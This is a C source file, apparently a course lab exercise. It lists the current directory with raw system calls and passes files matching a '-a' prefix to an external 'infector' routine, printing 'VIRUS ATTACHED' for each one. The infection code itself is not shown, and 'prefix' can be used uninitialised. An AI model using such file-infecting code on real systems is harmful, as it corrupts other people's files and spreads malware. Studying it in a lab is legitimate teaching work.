#include <dirent.h>
#include "util.h"

#define EXIT 1
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define STDOUT 1
#define STDERR 2
#define MODE 0777
#define O_RDONLY 0
#define GETDENTS 141
#define BUFSIZE 8192

extern int system_call();
extern void infector(char *);

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

int main(int argc, char *argv[])
{
    int fd, res, pos, i;
    char *prefix, buffer[BUFSIZE], msg[] = " VIRUS ATTACHED";
    struct linux_dirent *d;

    fd = system_call(SYS_OPEN, ".", O_RDONLY, MODE);
    if (fd < 0)
    {
        system_call(SYS_WRITE, STDERR, "Error opening directory", 32);
        system_call(EXIT, 0x55);
    }

    res = system_call(GETDENTS, fd, buffer, BUFSIZE);

    if (res == -1)
    {
        system_call(SYS_WRITE, STDERR, "Error reading directory", 32);
        system_call(EXIT, 0x55);
    }
    if (res == 0)
        return 0;

    for (i = 1; i < argc; i++)
        if (strncmp(argv[i], "-a", 2) == 0)
        {
            prefix = argv[i] + 2;
            break;
        }
    for (pos = 0; pos < res;)
    {
        d = (struct linux_dirent *)(buffer + pos);

        system_call(SYS_WRITE, STDOUT, (d->d_name) - 1, strlen(d->d_name) + 1);
        if (prefix && strncmp(prefix, (d->d_name) - 1, strlen(prefix)) == 0)
        {
            infector(d->d_name - 1);
            system_call(SYS_WRITE, STDOUT, msg, sizeof(msg) - 1);
        }
        system_call(SYS_WRITE, STDOUT, "\n", 1);

        pos += d->d_reclen;
    }

    system_call(SYS_CLOSE, fd);

    return 0;
}
